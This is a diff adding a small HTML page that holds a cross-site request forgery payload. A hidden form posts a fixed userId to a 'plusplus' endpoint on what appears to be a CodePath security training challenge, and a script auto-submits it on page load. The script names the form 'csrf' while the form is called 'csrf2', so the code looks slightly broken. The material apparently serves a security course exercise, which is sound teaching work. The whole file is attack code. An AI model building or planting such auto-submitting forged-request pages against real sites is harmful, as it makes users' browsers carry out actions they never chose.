@@ -1,0 +1,5 @@
+<FORM NAME="csrf2" action="https://security.codepath.com/user/csrfchallengetwo/plusplus"
+METHOD="POST">
+<input type="hidden" name='userId' value="e7d9dfabd8cd8efbd468bf63dff47a56df8f8b40">
+</FORM>
+<script>document.csrf.submit();</script>
